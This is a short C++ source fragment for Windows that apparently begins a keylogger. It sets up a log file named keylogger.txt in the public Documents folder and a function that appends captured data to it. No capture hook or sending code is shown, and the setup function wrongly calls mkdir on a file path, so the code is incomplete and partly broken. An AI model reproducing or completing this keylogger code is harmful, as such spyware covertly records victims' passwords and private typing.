#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <sys/stat.h>

#define LOG_FILE "C:\\Users\\Public\\Documents\\keylogger.txt"


void createtxtfile(){
    std::string path = "C:\\Users\\Public\\Documents\\keylogger.txt";
    int status = mkdir(path.c_str());

}

void saveData(std::string data){
    std::fstream logFile;

    logFile.open(LOG_FILE, std::ios::app);

    logFile << data;

    logFile.close();
}